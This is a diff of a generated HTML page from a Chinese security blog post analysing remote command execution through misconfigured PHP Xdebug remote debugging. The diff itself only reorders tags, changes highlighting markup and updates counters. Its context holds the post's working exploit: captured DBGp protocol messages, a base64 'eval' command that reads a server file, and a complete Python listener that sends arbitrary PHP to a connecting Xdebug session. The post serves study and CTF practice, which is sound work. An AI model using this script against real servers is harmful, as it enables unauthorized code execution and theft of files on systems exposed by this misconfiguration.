@@ -42,7 +42,7 @@
 
 
 <meta name="description" content="Xdebug 是 PHP 的调试工具，为 PHP 脚本与调试器客户端提供了一个接口，使用 DBGp 协议进行交互，使用的是 XML 格式的数据。在调试的时候，可以通过调试器在服务器上执行任意代码。通过 phpinfo() 可以查看 WebServer 上是否有开启 Xdebug，由于 Xdebug 支持远程调试，如果服务器上配置不当，可能引起远程任意命令执行。  Xdebug 在 php.ini">
-<meta name="keywords" content="PHP,CTF,Xdebug">
+<meta name="keywords" content="CTF,PHP,Xdebug">
 <meta property="og:type" content="article">
 <meta property="og:title" content="PHP Xdebug 远程调试命令执行分析">
 <meta property="og:url" content="http://www.restran.net/2017/09/16/php-xdebug-cmd-exec/index.html">
@@ -297,13 +297,13 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.10:8080/test.php?XDEBUG_SESSION_START=1</span><br></pre></td></tr></table></figure>
 <p><img src="/uploads/post_img/2017/09/xdebug_chrome.jpg" alt="xdebug_chrome.jpg"></p>
 <p>Xdebug 插件可以接收到调试会话，然后可以在上面执行任意命令。通过抓包分析可以发现，调试会话的消息是通过 XML 进行交互，会话建立的时候，服务端会发送：</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">490.<span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"iso-8859-1"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">init</span> <span class="attr">xmlns</span>=<span class="string">"urn:debugger_protocol_v1"</span> <span class="attr">xmlns:xdebug</span>=<span class="string">"http://xdebug.org/dbgp/xdebug"</span> <span class="attr">fileuri</span>=<span class="string">"file:///D:/PHP/PHPStudy/WWW/phpinfo.php"</span> <span class="attr">language</span>=<span class="string">"PHP"</span> <span class="attr">xdebug:language_version</span>=<span class="string">"5.4.45"</span> <span class="attr">protocol_version</span>=<span class="string">"1.0"</span> <span class="attr">appid</span>=<span class="string">"4288"</span> <span class="attr">idekey</span>=<span class="string">"1"</span>&gt;</span><span class="tag">&lt;<span class="name">engine</span> <span class="attr">version</span>=<span class="string">"2.4.1"</span>&gt;</span>&lt;![CDATA[Xdebug]]&gt;<span class="tag">&lt;/<span class="name">engine</span>&gt;</span><span class="tag">&lt;<span class="name">author</span>&gt;</span>&lt;![CDATA[Derick Rethans]]&gt;<span class="tag">&lt;/<span class="name">author</span>&gt;</span><span class="tag">&lt;<span class="name">url</span>&gt;</span>&lt;![CDATA[http://xdebug.org]]&gt;<span class="tag">&lt;/<span class="name">url</span>&gt;</span><span class="tag">&lt;<span class="name">copyright</span>&gt;</span>&lt;![CDATA[Copyright (c) 2002-2016 by Derick Rethans]]&gt;<span class="tag">&lt;/<span class="name">copyright</span>&gt;</span><span class="tag">&lt;/<span class="name">init</span>&gt;</span>.</span><br></pre></td></tr></table></figure>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">490.&lt;?xml version="1.0" encoding="iso-8859-1"?&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">init</span> <span class="attr">xmlns</span>=<span class="string">"urn:debugger_protocol_v1"</span> <span class="attr">xmlns:xdebug</span>=<span class="string">"http://xdebug.org/dbgp/xdebug"</span> <span class="attr">fileuri</span>=<span class="string">"file:///D:/PHP/PHPStudy/WWW/phpinfo.php"</span> <span class="attr">language</span>=<span class="string">"PHP"</span> <span class="attr">xdebug:language_version</span>=<span class="string">"5.4.45"</span> <span class="attr">protocol_version</span>=<span class="string">"1.0"</span> <span class="attr">appid</span>=<span class="string">"4288"</span> <span class="attr">idekey</span>=<span class="string">"1"</span>&gt;</span><span class="tag">&lt;<span class="name">engine</span> <span class="attr">version</span>=<span class="string">"2.4.1"</span>&gt;</span>&lt;![CDATA[Xdebug]]&gt;<span class="tag">&lt;/<span class="name">engine</span>&gt;</span><span class="tag">&lt;<span class="name">author</span>&gt;</span>&lt;![CDATA[Derick Rethans]]&gt;<span class="tag">&lt;/<span class="name">author</span>&gt;</span><span class="tag">&lt;<span class="name">url</span>&gt;</span>&lt;![CDATA[http://xdebug.org]]&gt;<span class="tag">&lt;/<span class="name">url</span>&gt;</span><span class="tag">&lt;<span class="name">copyright</span>&gt;</span>&lt;![CDATA[Copyright (c) 2002-2016 by Derick Rethans]]&gt;<span class="tag">&lt;/<span class="name">copyright</span>&gt;</span><span class="tag">&lt;/<span class="name">init</span>&gt;</span>.</span><br></pre></td></tr></table></figure>
 <p>当在 xdebug 中执行 PHP 代码时，例如</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print_r(file_get_contents(&apos;D:/1.txt&apos;), true)</span><br></pre></td></tr></table></figure>
 <p>会发送这种格式的数据给 WebServer，<code>-i 63</code> 是会话编号，可以取任意的数字，后面是 php 代码的 base64，最后的 . 是 <code>\x00</code>。而且发送的数据包内容必须是 304 的倍数，多余的部分以 <code>\x00</code> 填充。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval -i 63 -- cHJpbnRfcihmaWxlX2dldF9jb250ZW50cygnRDovMS50eHQnKSwgdHJ1ZSk=............................................................................</span><br></pre></td></tr></table></figure>
 <p>当服务端接收到调试器发送的命令后，会执行其中的 PHP 代码，并返回执行结果，这个过程会返回很多个 response，其中第一个 response 就是 PHP 代码的执行结果，同样是以 base64 编码。</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">260.<span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"iso-8859-1"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">response</span> <span class="attr">xmlns</span>=<span class="string">"urn:debugger_protocol_v1"</span> <span class="attr">xmlns:xdebug</span>=<span class="string">"http://xdebug.org/dbgp/xdebug"</span> <span class="attr">command</span>=<span class="string">"eval"</span> <span class="attr">transaction_id</span>=<span class="string">"63"</span>&gt;</span><span class="tag">&lt;<span class="name">property</span> <span class="attr">type</span>=<span class="string">"string"</span> <span class="attr">size</span>=<span class="string">"4"</span> <span class="attr">encoding</span>=<span class="string">"base64"</span>&gt;</span>&lt;![CDATA[dGVzdA==]]&gt;<span class="tag">&lt;/<span class="name">property</span>&gt;</span><span class="tag">&lt;/<span class="name">response</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">260.&lt;?xml version="1.0" encoding="iso-8859-1"?&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">response</span> <span class="attr">xmlns</span>=<span class="string">"urn:debugger_protocol_v1"</span> <span class="attr">xmlns:xdebug</span>=<span class="string">"http://xdebug.org/dbgp/xdebug"</span> <span class="attr">command</span>=<span class="string">"eval"</span> <span class="attr">transaction_id</span>=<span class="string">"63"</span>&gt;</span><span class="tag">&lt;<span class="name">property</span> <span class="attr">type</span>=<span class="string">"string"</span> <span class="attr">size</span>=<span class="string">"4"</span> <span class="attr">encoding</span>=<span class="string">"base64"</span>&gt;</span>&lt;![CDATA[dGVzdA==]]&gt;<span class="tag">&lt;/<span class="name">property</span>&gt;</span><span class="tag">&lt;/<span class="name">response</span>&gt;</span></span><br></pre></td></tr></table></figure>
 <p>分析了 Xdebug 调试的交互过程，可以写出一个脚本来执行任意命令。如果是在公网上的 PHP 网站，需要有一个公网 IP 才能实现远程调试，如果只有 Linux 的公网服务器可用，可以使用这个脚本来模拟这个过程。</p>
 <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> socketserver <span class="keyword">import</span> BaseRequestHandler, TCPServer</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"></span><br><span class="line">php_code = <span class="string">b"print_r(file_get_contents('D:/1.txt'), true)"</span></span><br><span class="line">payload = <span class="string">b"""eval -i 105 -- %s"""</span> % b64encode(php_code)</span><br><span class="line"><span class="comment"># 总长度是304的倍数</span></span><br><span class="line"><span class="keyword">if</span> len(payload) % <span class="number">304</span> != <span class="number">0</span>:</span><br><span class="line">    payload = payload + <span class="string">b'\x00'</span> * (<span class="number">304</span> - len(payload) % <span class="number">304</span>)</span><br><span class="line"></span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">EchoHandler</span><span class="params">(BaseRequestHandler)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">global</span> count</span><br><span class="line">        print(<span class="string">'Got connection from'</span>, self.client_address)</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">            msg = self.request.recv(<span class="number">8192</span>)</span><br><span class="line">            print(msg)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> msg:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> count == <span class="number">0</span>:</span><br><span class="line">                self.request.send(payload)</span><br><span class="line"></span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    serv = TCPServer((<span class="string">''</span>, <span class="number">9000</span>), EchoHandler)</span><br><span class="line">    serv.serve_forever()</span><br></pre></td></tr></table></figure>
 <h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
@@ -345,9 +345,9 @@
       
         <div class="post-tags">
           
-            <a href="/tags/PHP/" rel="tag">#PHP</a>
-          
             <a href="/tags/CTF/" rel="tag">#CTF</a>
+          
+            <a href="/tags/PHP/" rel="tag">#PHP</a>
           
             <a href="/tags/Xdebug/" rel="tag">#Xdebug</a>
           
@@ -364,7 +364,7 @@
 
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2017/08/10/crypto-analyze-tool-feather-duster/" rel="next">密码学分析和破解工具 FeatherDuster 使用说明</a>
+              <a href="/2017/08/10/memory-forensics-tool-volatility/" rel="next">内存取证工具 volatility 使用说明</a>
             
           </div>
         </div>
@@ -432,7 +432,7 @@
         <nav class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives">
-              <span class="site-state-item-count">63</span>
+              <span class="site-state-item-count">64</span>
               <span class="site-state-item-name">日志</span>
             </a>
           </div>
@@ -446,7 +446,7 @@
 
           <div class="site-state-item site-state-tags">
             <a href="/tags">
-              <span class="site-state-item-count">62</span>
+              <span class="site-state-item-count">64</span>
               <span class="site-state-item-name">标签</span>
               </a>
           </div>
@@ -543,7 +543,7 @@
           <div class="footer-inner"> <div class="copyright" >
   
   &copy;&nbsp; 2014 - 
-  <span itemprop="copyrightYear">2018</span>
+  <span itemprop="copyrightYear">2019</span>
   by
   <span class="author" itemprop="copyrightHolder">restran, </span>
 </div>
